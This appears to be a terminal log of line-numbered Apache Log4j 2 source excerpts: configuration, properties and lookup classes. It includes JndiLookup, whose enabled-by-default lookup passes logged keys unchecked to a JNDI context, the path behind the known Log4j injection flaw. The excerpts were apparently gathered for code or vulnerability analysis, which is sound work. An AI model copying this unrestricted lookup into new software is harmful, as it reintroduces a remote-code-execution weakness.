[2;36m                    [0m         [1;36m27[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import java.util.concurrent.ConcurrentHashMap;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import java.util.concurrent.ConcurrentMap;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:import java.util.concurrent.CopyOnWriteArrayList;[0m                                [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:import org.apache.logging.log4j.Level;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:import org.apache.logging.log4j.core.Appender;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:import org.apache.logging.log4j.core.Filter;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:import org.apache.logging.log4j.core.Layout;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:import org.apache.logging.log4j.core.appender.ConsoleAppender;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginAttr;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginConfiguration;[0m         [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginElement;[0m               [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginFactory;[0m               [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginManager;[0m               [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginNode;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginType;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginValue;[0m                 [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:import org.apache.logging.log4j.core.filter.AbstractFilterable;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:import org.apache.logging.log4j.core.helpers.Constants;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:import org.apache.logging.log4j.core.helpers.NameUtil;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:import org.apache.logging.log4j.core.layout.PatternLayout;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:import org.apache.logging.log4j.core.lookup.Interpolator;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:import org.apache.logging.log4j.core.lookup.MapLookup;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:import org.apache.logging.log4j.core.lookup.StrLookup;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:import org.apache.logging.log4j.core.lookup.StrSubstitutor;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:import org.apache.logging.log4j.core.net.Advertiser;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:import org.apache.logging.log4j.util.PropertiesUtil;[0m                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/BaseConfiguration.jav[0m[1;92ma:80[0m[39m-[0m[1;36m1[0m [2m                [0m
[2;36m                    [0m         [1;36m10[0m                                                                                  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     * The ConfigurationMonitor that checks for configuration changes.[0m           [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    protected ConfigurationMonitor monitor = new [0m[1;35mDefaultConfigurationMonitor[0m[1;39m([0m[1;39m)[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:     * The Advertiser which exposes appender configurations to external systems.[0m [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    protected Advertiser advertiser = new [0m[1;35mDefaultAdvertiser[0m[1;39m([0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:    private String name;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:    private ConcurrentMap<String, Appender<?>> appenders = new [0m                  [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, Appender<?>>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:    private ConcurrentMap<String, LoggerConfig> loggers = new [0m                   [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, LoggerConfig>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:    private final StrLookup tempLookup = new [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:    private final StrSubstitutor subst = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mtempLookup[0m[1;39m)[0m[39m;[0m         [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    private LoggerConfig root = new [0m[1;35mLoggerConfig[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:    private final boolean started = false;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:    private final ConcurrentMap<String, Object> componentMap = new [0m             [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:     * Constructor.[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:    protected [0m[1;35mBaseConfiguration[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:        rootNode = new [0m[1;35mNode[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/BaseConfiguration.jav[0m[1;92ma:320[0m[39m-[0m [2m                [0m
[2;36m                    [0m         [1;36m331[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m320[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m321[0m[39m:     * Adds an Appender to the configuration.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m322[0m[39m:     * @param appender The Appender to add.[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m323[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m324[0m[39m:    public void [0m[1;35maddAppender[0m[1;39m([0m[39mfinal Appender appender[0m[1;39m)[0m[39m [0m[1;39m{[0m                          [2m                [0m
[2;36m                    [0m         [1;36m325[0m[39m:        [0m[1;35mappenders.put[0m[1;39m([0m[1;35mappender.getName[0m[1;39m([0m[1;39m)[0m[39m, appender[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m326[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m327[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m328[0m[39m:    @Override[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m329[0m[39m:    public StrSubstitutor [0m[1;35mgetSubst[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m330[0m[39m:        return subst;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m331[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:26[0m[39m-[0m[1;36m35[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Looks up keys from JNDI resources.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:52[0m[39m-[0m[1;36m64[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:81[0m[39m-[0m[1;36m88[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:19[0m[39m-[0m[1;36m23[0m           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.io.IOException;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.io.InputStream;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.Properties;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:28[0m[39m-[0m[1;36m70[0m           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:public class PropertiesUtil [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:    private static final PropertiesUtil LOG4J_PROPERTIES = new [0m                  [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil[0m[1;39m([0m[32m"log4j2.component.properties"[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private final Properties props;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal Properties props[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        this.props = props;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal String propsLocn[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:        this.props = new [0m[1;35mProperties[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:        final ClassLoader loader = [0m[1;35mProviderUtil.findClassLoader[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        final InputStream in = [0m[1;35mloader.getResourceAsStream[0m[1;39m([0m[39mpropsLocn[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        if [0m[1;39m([0m[39mnull != in[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:                [0m[1;35mthis.props.load[0m[1;39m([0m[39min[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:                [0m[35m/[0m[35m/[0m[39m ignored[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:            [0m[1;39m}[0m[39m finally [0m[1;39m{[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:                try [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:                    [0m[1;35min.close[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:                [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:                    [0m[35m/[0m[35m/[0m[39m ignored[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;39m}[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    public static PropertiesUtil [0m[1;35mgetProperties[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        return LOG4J_PROPERTIES;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public String [0m[1;35mgetStringProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        String prop = null;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            prop = [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal SecurityException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            [0m[35m/[0m[35m/[0m[39m Ignore[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? [0m[1;35mprops.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : prop;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:118[0m[39m-[0m[1;36m125[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        return [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mname, false[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name, final boolean [0m         [2m                [0m
[2;36m                    [0m         [39mdefaultValue[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        final String prop = [0m[1;35mgetStringProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? defaultValue : [0m[32m"true"[0m[1;35m.equalsIgnoreCase[0m[1;39m([0m[39mprop[0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/DateLookup.jav[0m[1;92ma:19[0m[39m-[0m[1;36m26[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.text.DateFormat;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.text.SimpleDateFormat;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.Date;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/DateLookup.jav[0m[1;92ma:31[0m[39m-[0m[1;36m70[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"date"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:public class DateLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    private static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * @param key the format to use. If null, the default DateFormat will be [0m    [2m                [0m
[2;36m                    [0m         [39mused.[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        return [0m[1;35mformatDate[0m[1;39m([0m[1;35mSystem.currentTimeMillis[0m[1;39m([0m[1;39m)[0m[39m, key[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param key the format to use. If null, the default DateFormat will be [0m    [2m                [0m
[2;36m                    [0m         [39mused.[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        return [0m[1;35mformatDate[0m[1;39m([0m[1;35mevent.getMillis[0m[1;39m([0m[1;39m)[0m[39m, key[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
